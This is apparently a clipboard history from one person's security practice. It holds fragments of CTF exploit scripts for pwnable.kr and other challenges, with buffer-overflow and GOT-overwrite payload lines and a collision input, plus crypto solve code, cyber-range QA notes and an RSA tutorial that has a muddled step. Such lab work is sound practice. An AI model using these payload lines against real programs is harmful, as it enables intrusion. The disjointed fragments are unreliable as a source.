29fe9d8ad53c46497f84183891d85f36|file:///home/neo/pwnablexyz/jump/exploit.py|69|12|v|python
	int(str(hex(return_addr)
9d4d4e6c3d2e1dca95d96468ac0b9ea4|file:///home/neo/pwnablexyz/jump/exploit.py|69|12|^v|python
	int(str(hex(return_addr))[-2:], 16) 
5d03dd2135fa4c45501064058fadf97d|file:///home/neo/pwnablexyz/jump/exploit.py|81|1|V|python
	print(chr(original_rbp_byte))
b2ba0d9873e5a71b064e792ea37f0e40|file:///home/neo/pwnablexyz/jump/exploit.py|80|21|v|python
	(int(str(hex(return_addr))[-2:], 16) - 0x40) % 100
130decc0e8e000fef37ce7e2deab2c2c|file:///home/neo/pwnablexyz/jump/exploit.py|81|1|V|python
	log.info('%x', original_rbp_byte)
0090c08b35234b33524bf542fc24de23|file:///home/neo/pwnablexyz/jump/exploit.py|82|10|v|python
	'%x', 
d436861f3c142748baabc3183487519a|file:///home/neo/cyberranges/work/problematic.md|12|1|V|vimwiki
	TODO: check it https://www.tecmint.com/install-rsyslog-centralized-logging-in-centos-ubuntu/
8007ef3ed2382ff334f84b6ab5ae5114|file:///home/neo/cyberranges/work/problematic.md|11|1|V|vimwiki
	- Add more time to set up the config
7cba512df23a186fa1c9bb046baf807c|file:///home/neo/cyberranges/work/problematic.md|10|1|V|vimwiki
	- Debian doesnt receive logs? - nothing listening on 514
211ab9e7c1690bd6facc45f91165c580|file:///home/neo/cyberranges/work/problematic.md|2|3|v|vimwiki
	Too slow loading
beb8e7728218144da3c8ddcb43251623|file:///home/neo/cyberranges/work/problematic.md|19|1|V|vimwiki
	- question Cat: display eol
29ed3f7625444ff665dba2a06c680457|file:///home/neo/cyberranges/work/problematic.md|19|1|V|vimwiki
	- less: line numbers
9cfdce6a5eec5e4832b72524c289e264|file:///home/neo/cyberranges/work/problematic.md|25|1|V|vimwiki
	- question proccess ps
56940095591ffb45f6ff8635b7dd1e5a|file:///home/neo/cyberranges/work/problematic.md|24|1|V|vimwiki
	- question vmstat process processor
2f84eced422fdaf70f94a057b00269bc|file:///home/neo/cyberranges/work/problematic.md|25|1|V|vimwiki
	- question process realtime
7587e6bcf6cf6fad21b00600413fb233|file:///home/neo/cyberranges/work/problematic.md|24|1|V|vimwiki
	- question storage device statistics
18e9c3c408a79bb79466f87f7a950fe4|file:///home/neo/cyberranges/work/problematic.md|37|1|V|vimwiki
	- Virtual hosts question
e6067227c8f4637545aa08f5e02ab752|file:///home/neo/pwnablekr/test.c|6|1|V|c
	    printf("%d\n", ip);
a0f4ae947a1c73d5c7fd82cb4a94acfb|file:///home/neo/pwnablekr/test.c|6|1|V|c
	    /* printf("%d\n", ip); */
e0db207b0e363905ca8dcf1c4fb75e04|file:///home/neo/pwnablekr/test.c|10|1|V|c
	        printf("%d\n", ip[i]);
e6a2c2fd12a559b1fa3690a23795b118|file:///home/neo/pwnablekr/collision/notes|6|1|V|
	./col `echo -e "a\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x88\x05\xd9\x1d"`
94ecbe1db97cac6ef09940e308938744|file:///home/neo/cyberranges/work/problematic.md|5|3|v|vimwiki
	Answers are correct
86561200f3f1f2bf5cd4218495323b3f|file:///home/neo/pwnablekr/bof/exploit.py|11|25|v|python
	30009
d5ec13d6fd680ef7892b097fb5c3f752|file:///home/neo/pwnablekr/bof/exploit.py|52|1|V|python
	io.sendline(b'a'*52 + p32(0xcafebabe))
c661b2b960e7c34f79b03a4144519e62|file:///home/neo/pwnablekr/bof/exploit.py|54|1|V|python
	io.sendline(b'a'*32)
70553886f834f783797db2b506ca54f0|file:///home/neo/pwnablekr/bof/exploit.py|54|1|V|python
	# io.send(chr(tty.EOF))
569a6cd66f6b91428ced948b0bdf86b5|file:///home/neo/pwnablekr/bof/exploit.py|53|1|V|python
	print(p32(0xcafebabe))
f34689956c4a67b7bdc4a060201c1a9e|file:///home/neo/pwnablekr/bof/exploit.py|52|1|V|python
	# io.recvuntil(': \n')
287e520eda4d8c9a1af8d69c4b582a9d|file:///home/neo/pwnablekr/passcode/exploit.py|51|1|V|python
	# io.sendline()
fec73573a47b7f9046aaf828cbe504f0|file:///home/neo/CTFs/0gctf2020/stringslice/stringslice-challenge.c|24|1|V|c
	//https://stackoverflow.com/questions/8534274/is-the-strrev-function-not-available-in-linux
4d3250413a6106853c13c84b845f0330|file:///home/neo/CTFs/0gctf2020/stringslice/stringslice-challenge.c|24|3|v|c
	https://stackoverflow.com/questions/8534274/is-the-strrev-function-not-available-in-linux
6acee6c9bb6412726ed054fa77060cc3|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|51|17|v|python
	ceof))
a2b03dd95c2b948146e139a32f4fbad4|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|51|17|v|python
	ceof
66f8c9849717ee8f5bc1630f4d44d2cb|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|11|50|v|python
	9997
df9831df9099278e4ae2d2e21f626e13|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|7|31|v|python
	getting
e20046157afba4b4995e9f253ac15521|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|7|31|v|python
	-confused
525f5c4ba2d92d4bde74547328a8285c|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|49|1|V|python
	io.recvuntil('Howdy! First floor.')
	io.sendline("howdy")
	io.recvuntil('Thanks and...')
	io.sendline("gig 'em")
	io.recvuntil("What's our secret way of knowing when another one of us is in a crowd?")
6867d0391551f5c20e9e27f041e37857|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|10|22|v|python
	challenges.tamuctf.com
b8599b9343f82e3bc30984ca4f3fea3f|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|12|25|v|python
	4352
11fb2743f58e602102c6845064fcb612|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|1|1|V|python
	!/usr/bin/env python
d29bbab0a6b147695bb0db56f0927949|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|1|1|V|python
	# -*- coding: utf-8 -*-
ae070b8568528ba0fbad8584a89b71b6|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|48|1|V|python
	io.send('\x04\x03\x01\x01\x01\x01')
84d422f8924d9838cee22f8379ee55c1|file:///home/neo/CTFs/0gctf2020/auth/exploit.py|49|10|v|python
	\x04\\x01\x01\x01\x01
0cd2796f8184cf949151c5a94b67a41d|file:///home/neo/cyberranges/work/problematic.md|16|1|V|vimwiki
	### Intro to Linux File System            
	+ Works fine
	
886a75097842b8c8381e6ebb173060e1|file:///home/neo/cyberranges/work/problematic.md|23|1|V|vimwiki
	### Managing Users Linux
	+ Works fine
	 
	### Performance Monitoring 
	+ Works fine, some grammar errors
9bcd46337eb9d57c5cb4bc36258ed5e7|file:///home/neo/cyberranges/work/problematic.md|42|1|V|vimwiki
	### Encoding101
	+ Works fine
ab47b55a90c6adc6cc20cdb5037faf86|file:///home/neo/cyberranges/work/problematic.md|3|1|V|vimwiki
	### Windows password 101
	- Loads a bit slow
	+ Other than that it works fine
	
	### Intro to Linux File System            
	+ Works fine
	
	### Managing Users Linux
	+ Works fine
	 
	### Performance Monitoring 
	+ Works fine, some grammar errors
	
	### Windows Password Dumping     
	+ Works fine (tried secretsdump.py)
	
	### Encoding101
	+ Works fine
6847102f68272391461a68c04c089ce6|file:///home/neo/cyberranges/work/problematic.md|23|1|V|vimwiki
	- Firewall needs to be turned off in CentOS to download the file
	- Rsyslog is not listening on port 514 on the CentOs machine - syslog reception lines in /etc/rsyslog.conf are commented out, the user needs to remove the comments and restart rsyslog (sudo systemctl restart rsyslog) to be able to receive logs from windows
	- 1 hour is to little to set up all the configurations
	- Question 'Snare - AUth logs rotation' - what is the answer?
0e038494c99283638f62250776175383|file:///home/neo/cyberranges/work/problematic.md|28|1|V|vimwiki
	### Viewing Unix / Linux Files            
	- question less: pattern
5e2cb07864eafe0c5eeca3e4dcfcd136|file:///home/neo/cyberranges/work/problematic.md|32|1|V|vimwiki
	### Sudo Operations in  Linux            
	- Incomplete question: "When a command is run with sudo, it prompts for the password. The password entered is cached a specific time period. Which sudo command line option would you use to ensure that the credential cache." ... is invalidated?
	- Wrong answer? "Jane, a full time application developer has been allowed to run multiple commands with sudo rights. As a root user, write a command to list all the commands that Jane can run as sudo."
	     - sudo -l -U Jane
	     - sudo -U Jane -l
	     - sudo -lU Jane
e9ef2dc609b137a09e4a3bca2127e35b|file:///home/neo/cyberranges/work/problematic.md|39|1|V|vimwiki
	### Http for Dummies           
	- Redirections question - I think something is missing in the redirection page
d6b84e7594e5354196ce18f460641ae0|file:///home/neo/cyberranges/work/problematic.md|42|1|V|vimwiki
	### Crypto101 - Encryption #1
	- Could not submit question: Operation not allowed. Questions can only be answered after the assessment has started
8e1f12f01572b85eed11c3fa45d3cd16|file:///home/neo/pwnablekr/passcode/exploit.py|53|1|V|python
	io.sendlineafter(': ', 'a'*100)
32b143b12fbfcbd6bec3365bf17b026e|file:///home/neo/pwnablekr/passcode/exploit.py|4|1|V|python
	import tty
35cab737029642d6fba0b74d790826af|file:///home/neo/pwnablekr/passcode/exploit.py|51|1|V|python
	print(io.recv())
0d7c0e4b327bc51b0147d70d555489dc|file:///home/neo/pwnablekr/passcode/exploit.py|55|1|V|python
	io.sendlineafter(': ', 'a'*100)
	io.recvuntil(': ')
	io.sendline(p32(0x528e6) + p32(0xcc07c9))
271bede2d3eb68b53a0ef51a22f7e080|file:///home/neo/pwnablekr/passcode/exploit.py|29|1|V|python
	            b welcome
	            b login
0e829b845845e431948dee31811cc56f|file:///home/neo/pwnablekr/passcode/exploit.py|15|1|V|python
	    return process([exe.path] + argv, stdin=PTY, raw=False)
0d4603e07b66dd73943fb4d1d341c57c|file:///home/neo/pwnablekr/passcode/exploit.py|53|1|V|python
	io.sendlineafter(': ', 'a'*10)
c8fb72cc064d904ea21d7fea3f3ae706|file:///home/neo/cyberranges/work/rsa/rsa101.md|122|1|V|vimwiki
	First, let's create an AES256 key and 
f31b33847b939112218ab1cc13ac2d93|file:///home/neo/cyberranges/work/rsa/rsa101.md|126|1|V|vimwiki
	openssl rsa -in private_key -out public_key -pubout -outform PEM
b16d85b15962fa689d05f5924ecc25b6|file:///home/neo/cyberranges/work/rsa/rsa101.md|130|1|V|vimwiki
	openssl rand -hex 64 -out key.bin
10ca215dc3e336969892ef69f9e6d00a|file:///home/neo/cyberranges/work/rsa/rsa101.md|116|1|V|vimwiki
	<h2>Practical usage</h2>
	In real life, RSA public key encryption is usually used to encrypt and exchange keys for a symmetric encryption algorithm, such as AES. The reason for this is that asymmetric encryption algorithms such as RSA are relatively slow and cannot encrypt large messages, and thus are not suitable for exchanging bulk encrypted data. On the other hand, asymmetric encryption is the perfect candidate for exchanging a secret key, since such keys are small (usually 128 - 256 bytes long). Also, two parties can safely exchange such a key, since the only requirement is to know the public key of the other party.
	
	Let's take a look at an example of encrypting/decrypting a secret key using an RSA key pair. We will use the OpenSSL https://www.openssl.org/ command line tool for the example.
	
	First, let's create a 2048 RSA private key:
	
	openssl genrsa -out rsa.private 2048
	
	Next, let's use the generated public key to create the corresponding private key:
	
	openssl rsa -in private_key -out public_key -pubout -outform PEM
	
	Now, let's create a random 32-byte secret:
	openssl rand -hex -out secret_file 32
	
	We can now use the RSA public key to encrypt the secret:
	openssl rsautl -encrypt -pubin -inkey public_key -in secret_file -out secret_file.enc
	
67afb337ad8e37f32b476a96cc89ce3d|file:///home/neo/cyberranges/work/rsa/rsa101.md|116|1|V|vimwiki
	<h2>Practical usage</h2>
	In real life, RSA public key encryption is usually used to encrypt and exchange keys for a symmetric encryption algorithm, such as AES. The reason for this is that asymmetric encryption algorithms such as RSA are relatively slow and cannot encrypt large messages, and thus are not suitable for exchanging bulk encrypted data. On the other hand, asymmetric encryption is the perfect candidate for exchanging a secret key, since such keys are small (usually 128 - 256 bytes long). Also, two parties can safely exchange such a key, since the only requirement is to know the public key of the other party.
	
	Let's take a look at an example of encrypting/decrypting a secret key using an RSA key pair. We will use the OpenSSL https://www.openssl.org/ command line tool for the example.
	
	First, let's create a 2048 RSA private key:
	
	openssl genrsa -out rsa.private 2048
	
	Next, let's use the generated public key to create the corresponding private key:
	
	openssl rsa -in private_key -out public_key -pubout -outform PEM
	
	Now, let's create a random 32-byte secret:
	openssl rand -hex -out secret_file 32
	
	We can now use the RSA public key to encrypt the secret:
	openssl rsautl -encrypt -pubin -inkey public_key -in secret_file -out secret_file.enc
	
	Finally, we can use the private key to decrypt the encrypted secret and get the original key:
	openssl rsautl -decrypt -inkey private_key -in secret_file.enc -out secret_file.dec
	
bc1d3d3f60807ac9c6d5cb9f4a119e64|file:///home/neo/cyberranges/work/rsa/secret_file|1|1|V|
	deca60f5d5bf56956f65872d560acd9e7e4539cbefbb58f5449bad116f771121
8e36b52fe1681f70d3609e300f37f6df|file:///home/neo/hackthebox/reverse/impossible/solve.py|1|1|v|python
	local_48 = 
f3c2d534a066b26260667581abcfd191|file:///home/neo/hackthebox/reverse/impossible/solve.py|2|1|v|python
	local_47 = 
69b67ad677a057fe897ee3d32dded4b0|file:///home/neo/hackthebox/reverse/impossible/solve.py|3|1|v|python
	local_46 = 
def4c1e2ca695cc34d182b2cf2ee1bca|file:///home/neo/hackthebox/reverse/impossible/solve.py|4|1|v|python
	local_45 = 
66cb302b4a62f0ec1ca27be09e56f10d|file:///home/neo/hackthebox/reverse/impossible/solve.py|5|1|v|python
	local_44 = 
83b8a33d22df653a155d21b6be983d42|file:///home/neo/hackthebox/reverse/impossible/solve.py|6|1|v|python
	local_43 = 
00b3ce67795efc46a96dcd7155a645dd|file:///home/neo/hackthebox/reverse/impossible/solve.py|7|1|v|python
	local_42 = 
33471aa6b7192a45c8a9d5b45175f793|file:///home/neo/hackthebox/reverse/impossible/solve.py|8|1|v|python
	local_41 = 
da0cd747af0a677ea397942c639a73ec|file:///home/neo/hackthebox/reverse/impossible/solve.py|9|1|v|python
	local_40 = 
52093516ecc074b4a01b4512cad5d235|file:///home/neo/hackthebox/reverse/impossible/solve.py|10|1|v|python
	local_3f = 
922bf6b0aad6e5129752c32d0079d4f4|file:///home/neo/hackthebox/reverse/impossible/solve.py|11|1|v|python
	local_3e = 
9e377e1f3dff22e1eac882367004fb35|file:///home/neo/hackthebox/reverse/impossible/solve.py|12|1|v|python
	local_3d = 
c33783064d05f47d47bf3df0eda49b9c|file:///home/neo/hackthebox/reverse/impossible/solve.py|13|1|v|python
	local_3c = 
653a5708b89da2122f2f3fe344590ea0|file:///home/neo/hackthebox/reverse/impossible/solve.py|14|1|v|python
	local_3b = 
5ed238444c0d789ad1d74bb9b7aab297|file:///home/neo/hackthebox/reverse/impossible/solve.py|15|1|v|python
	local_3a = 
f007ac81ca1c59a2c3de4dfae7abe721|file:///home/neo/hackthebox/reverse/impossible/solve.py|16|1|v|python
	local_39 = 
6fb0cd66cc55bafc026d62abf75c3ef3|file:///home/neo/hackthebox/reverse/impossible/solve.py|17|1|v|python
	local_38 = 
93225f8aa09ec8004c0b986cc9df7ed1|file:///home/neo/hackthebox/reverse/impossible/solve.py|18|1|v|python
	local_37 = 
3b4f3f142d57ce54425a1e8c4ec461e1|file:///home/neo/hackthebox/reverse/impossible/solve.py|19|1|v|python
	local_36 = 
982ca3b6cf9876e9e7329325d62cd558|file:///home/neo/hackthebox/reverse/impossible/solve.py|20|1|v|python
	local_35 = 
57b7d71c024738a9791724ef00afb091|file:///home/neo/pwnablekr/passcode/exploit.py|7|1|V|python
	exe = context.binary = ELF('./passcode')
15472cd29f632e34f039403f2e635f66|file:///home/neo/pwnablekr/passcode/exploit.py|8|31|v|python
	passcode
dd81864b2b0e5b0bfbbfa124d4ad2b87|file:///home/neo/.zshrc|126|1|V|zsh
	# export PYTHONPATH=/home/neo/.local/lib/python3.7/site-packages:/home/neo/.local/lib/python3.8/site-packages
43770a0933e947a29dbbb9e08e782543|file:///home/neo/.zshrc|126|64|v|zsh
	/home/neo/.local/lib/python3.8/site-packages
04a56793503ca1a9de7a539cb97a10e7|file:///home/neo/pwnablekr/passcode/exploit.py|55|1|V|python
	io.sendline(b'a' * OFFSET + p32(0x528e6) + p32(0xcc07c9))
fc0ceb6c4bf692e04a76c8bae98cb194|file:///home/neo/pwnablekr/passcode/exploit.py|56|42|v|python
	+ p32(0xcc07c9)
a95bf3174b1583d3f3af697859cc12e9|file:///home/neo/pwnablekr/passcode/exploit.py|57|1|V|python
	# io.sendline(b'a' * OFFSET + p32(0x528e6) + p32(0xcc07c9))
8107093f77c4366e668dcb6ef9a29d8d|file:///home/neo/pwnablekr/passcode/exploit.py|57|33|v|python
	0x528e6
9c3a7ce8b2b7e17129fc099c9c2c050a|file:///home/neo/pwnablekr/passcode/exploit.py|8|28|v|python
	'./passcode'
7b055d1624af0cd22b78e7490f6756e7|file:///home/neo/pwnablekr/passcode/exploit.py|20|1|V|python
	def remote(argv=[], *a, **kw):
64c8b3e5ffc90bef521c8620dfcb67d1|file:///home/neo/pwnablekr/passcode/exploit.py|15|1|V|python
	def local(argv=[], *a, **kw):
	    # return process([exe.path] + argv, *a, **kw)
	    return process([exe.path] + argv, stdin=PTY, raw=False)
f5ddaf0ca7929578b408c909429f68f2|file:///home/neo/pwnablekr/passcode/exploit.py|19|5|v|python
	local
d1272af70cde1b25f3611dee6fb2deb2|file:///home/neo/pwnablekr/passcode/exploit.py|49|20|v|python
	local(argv, *a, **kw)
5ba181770f572ec68e5ca015b828c3f3|file:///home/neo/pwnablekr/passcode/exploit.py|20|5|V|python
	    # return process([exe.path] + argv, *a, **kw)
3b3bda163c0958a296b11266d8823071|file:///home/neo/pwnablekr/passcode/exploit.py|21|12|v|python
	process([exe.path] + argv, stdin=PTY, raw=False)
6e712afa949f8c61888a52af424333a2|file:///home/neo/pwnablekr/passcode/exploit.py|63|1|V|python
	PRINTF_GOT = exe.got.fflush
4f9549c16e39ee90965bf00f7c95f236|file:///tmp/neomutt-neo-1000-31941-9148347806815264793|3|1|V|mail
	I made the alterterations 
063e9becee31072b777bf1178aec7d7f|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|1|1|V|python
	from Crypto.Cipher import AES
	from random import randint
	from time import time
	from struct import pack
	import sys
	
	BS = AES.block_size
	pad = lambda s: s + '\x00' * (BS - len(s) % BS)
	
	def randkey():
	    random_number = randint(0, int(time())) & 0xFFFFFF
	    key = pack('<I', random_number)
	    return pad(key)
	
	def encrypt(data, key1, key2):
	    data = pad(data)
	    
	    c1 = AES.new(key1, AES.MODE_ECB)
	    enc = c1.encrypt(data)
	
	    c2 = AES.new(key2, AES.MODE_ECB)
	    return c2.encrypt(enc)
	
9c32c96832d383e0bdff0912f83c3454|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|11|21|v|python
	randint(0, int(time())) & 0xFFFFFF
c8bf19e6c844322d09fa6a42813be384|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|1|1|V|python
	from Crypto.Cipher import AES
	from random import randint
	from time import time
	from struct import pack
	import sys
	
	BS = AES.block_size
	pad = lambda s: s + '\x00' * (BS - len(s) % BS)
6518c7e6e6911581155d1d12a49e0d23|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|2|1|V|python
	from random import randint
58ddf1806be98339891e6ccbad7a766b|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|2|1|V|python
	from time import time
f18f9d31b2e7ba4c462cd3e94f3ea7b3|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|15|1|V|python
	def encrypt(data, key1, key2):
	    data = pad(data)
	    
	    c1 = AES.new(key1, AES.MODE_ECB)
	    enc = c1.encrypt(data)
	
	    c2 = AES.new(key2, AES.MODE_ECB)
	    return c2.encrypt(enc)
b2ffb668116a7a0e58dc377a8be01098|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|8|5|V|python
	    data = pad(data)
adeebd07309c91963b1828767e65f35c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|17|24|v|python
	permutations
0bc25407f43518fd85187cd554cc8b01|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|16|1|V|python
	print(bytes_list)
12a55b56e4375d15af6dbd4077d2e61f|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|18|1|V|python
	print(combs)
2f9dfbe00c012409d68ec5918f5169fb|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|31|1|V|python
	## 1ae4c56852fde8ca7ec9823587550aa2be3c839caa0a565c6a299e7a5e2cc9998302960abc778ba3ee3c8ad0518b1edae12e4a387fbfcfa25e7b0e249a17ff61
20ae6dcf7ebe3bb192b7967d9dbb84d0|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|1|1|V|python
	from Crypto.Cipher import AES
	from random import randint
	from time import time
	from struct import pack
	import sys
	
	BS = AES.block_size
	pad = lambda s: s + '\x00' * (BS - len(s) % BS)
	
	def randkey():
	    random_number = randint(0, int(time())) & 0xFFFFFF
	    key = pack('<I', random_number)
	    return pad(key)
	
	def encrypt(data, key1, key2):
	    data = pad(data)
	    
	    c1 = AES.new(key1, AES.MODE_ECB)
	    enc = c1.encrypt(data)
	
	    c2 = AES.new(key2, AES.MODE_ECB)
	    return c2.encrypt(enc)
	
	
	key1 = randkey()
	key2 = randkey()
40b5ce7ec42067ea7ea6509178b5f085|file:///home/neo/CTFs/0gctf2020/stringslice/stringslice-challenge.c|15|1|V|c
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	
	#include <termios.h>
	#include <unistd.h>
26f7f806219768ca9371dfe68c84615f|file:///home/neo/CTFs/0gctf2020/stringslice/stringslice-challenge.c|95|1|V|c
		setvbuf(stdout, NULL, _IONBF, 0);
0f3ae3c06dd8dc7a02eb2ffba33b468f|file:///home/neo/CTFs/0gctf2020/auth/auth-challenge.c|114|1|v|c
		char in;
		printf("Authenticate:\r\n");
		while( (in=getchar()) != EOF) {
			if(indx == buffer_sz-1) {
				buffer_sz+=INC_SIZE;
				buffer=realloc(buffer,buffer_sz);
			}
			buffer[indx++]=in;
		} 
	
	
a65d47887dc21fb67c328997f216dd53|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|11|2|V|c
		printf("Authenticate:\r\n");
7671a4346fb8d99c27127504726f166f|file:///home/neo/CTFs/0gctf2020/auth/auth-challenge.c|112|1|V|c
		unsigned char indx=0;
1f866b843f71b803ecc7ac9d7378bb05|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|13|1|V|c
			if(indx == buffer_sz-1) {
				buffer_sz+=INC_SIZE;
				buffer=realloc(buffer,buffer_sz);
			}
b3335bdc92b1b95f02d9a5e192fed466|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|40|1|V|c
	    printf("%d\n", p->magic);
2f3a4fccca6406e35bcf33e92dd93135|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|41|23|v|c
	magic
b08ec074fc12db4c02fc33ac38ca40b1|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|42|1|V|c
	    printf("%d\n", p->session);
21d6f40cfb511982e4424e0e250a9557|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|44|23|v|c
	session
f6478250d2dcf4435a861d2c60044683|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|5|1|V|c
	#include <termios.h>
53eeb4f4ddb5ce22eb2a401a11c27d6a|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|43|1|V|c
	    printf("Magic: %x\n", p->magic);
02700e454d679f31f27c6f0768986dd1|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|40|13|v|c
	Magic
85a48cff5ac995148107d636a3907fef|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|40|1|V|c
	    printf("Offset: %d\n", rd->offset);
923b25ea826144108123ed871325ac88|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|41|1|V|c
	    printf("Fd: %d\n", rd->fd);
ffef63803d81f57814a8ee5facab8fe7|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|42|1|V|c
	    printf("Fd defined length: %d\n", rd->fd_defined_length);
f3b351af208e109b9561e1ccfdb7dbb1|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|43|1|V|c
	    printf("Length: %d\n", rd->length);
ba2a9c6c8c77e03f83ef8bf543612275|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|44|13|v|c
	Length
99f8f0daf68068749e0a29720290dc18|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|39|1|V|c
	    printf("%s\n", buffer)
641dc077d25c4a12049069c2c02a06ac|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|39|5|V|c
	    printf("%s\n", buffer);
eb304c8163aeff5a535c4da330c6ff87|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|48|5|V|c
	    printf("%d\n", read_packet_size);
e339c79229397654b3cea088bf0338ae|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|47|15|v|c
	READ_PACKET
b60371a2a19436e386d834e52481151a|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|25|1|V|python
	#     for k2 in tqdm(keys):
3075bc27e66988d301d4bca72e275f1b|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|25|1|V|python
	#         pt = decrypt(ct, k1, k2)
	#         if b'flag' in pt or b'FLAG' in pt:
	#             print(pt)
14ac9845877bb34a160d150dd2dcbc32|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|27|1|V|python
	with open("possible_dec.txt", "wb") as f:
00efc0091bfdc20dfd9161f0f72eef4b|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|10|1|V|python
	    p1 = AES.new(key1, AES.MODE_ECB)
	    mid = p1.decrypt(ct)
54839c27e8c7a0dab657560c545cff1c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|14|22|v|python
	1, key2
c6312d00c71465c648eb1a52236e64bc|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|16|5|V|python
	    c1 = AES.new(key1, AES.MODE_ECB)
	    enc = c1.encrypt(data)
bbbed728fd37154ed95d458a4bebb68e|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|12|5|V|python
	    return p2.decrypt(ct)
1f88296f1d5522b47fc963b7a1c5c201|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|27|12|v|python
	possible_dec
88b70cd3cc09a8329cb04f7de2d6f19c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|35|1|V|python
	with open("possible_dec.txt", "r") as f:
	    decs = set(f.readlines())
54214aab5dae751af7e9debc21b28376|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|32|5|v|python
	decs
c234f66ac2b6de558cad27a25ddc30ab|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|18|12|v|python
	codecs.encode(
82fd9dfd013822b8f875ff27dfe73d4f|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|11|6|v|python
	codecs.decode(CT_HEX, "hex")
739360372a523bffec3437c6d9f2b942|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|12|1|v|python
	CT_BLOCKS
b8272145efd20df0a6e816e84885329c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|23|1|V|python
	print(BS)
c62c39878245ef079a94e41732687745|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|36|5|V|python
	    print(enc, len(enc))
a6ddb7d64ab8f7b25101a735c40d49ad|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|38|1|V|python
	cand_block = b'The flag is FLAG-'[:BS]
1d14eee5bfdf3b86fa78cfa36fcb75dc|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/solve.py|31|1|V|python
	with open("encrypted_block.txt", "r") as f:
	    encrypted_blocks = set(f.readlines())
	
	encs = []
	for enc in encrypted_blocks:
	    enc = bytes.fromhex(enc.strip())
	    encs.append(enc)
	
	for key in tqdm(keys):
	    dec = 
	
675e297e5f2969abd8cc97218e61410e|file:///home/neo/.zshrc|126|151|v|zsh
	:/home/neo/.local/lib/python2.7/site-packages
df3538b5bafac0c0bf7f814257d40ef5|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|30|10|v|python
	encode('hex')
a1db4acd0d5a3fb9af087ff028d488cb|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|42|1|V|python
	for enc in encs:
	    print(enc)
28fa0c14883d02c5a1e942dad387f730|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|37|22|v|python
	lines()
b84cbbda7231f1f6547d88021648c7c3|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|42|16|V|python
	for dec in decs:
	    print(dec)
03006df8538c2d93192a7fef16ec87c6|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|6|9|v|python
	b'\x82\xf8\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
11eb003e11cd8c3832bf5e35acdb7ae7|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|16|1|V|python
	CT_HEX = "697d5b1d7243b0aa362dd72e29b7f9aa5f0305bf4d8548b585741bdf0f65eafd3c59a1ec6230644b65c1683a384c62645377d0fdd61eb06de1852d55d8d51af0"
c16b03dc709034b6f8d8279352328590|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|9|15|v|python
	6168eba6692c25564c27e294613a51683bc8e8a2005813b69c1253a3127d0fa0296346ddf2e50e5d08283d87c1555b21c24250476e174f3b8ba6d3b1d0f85635
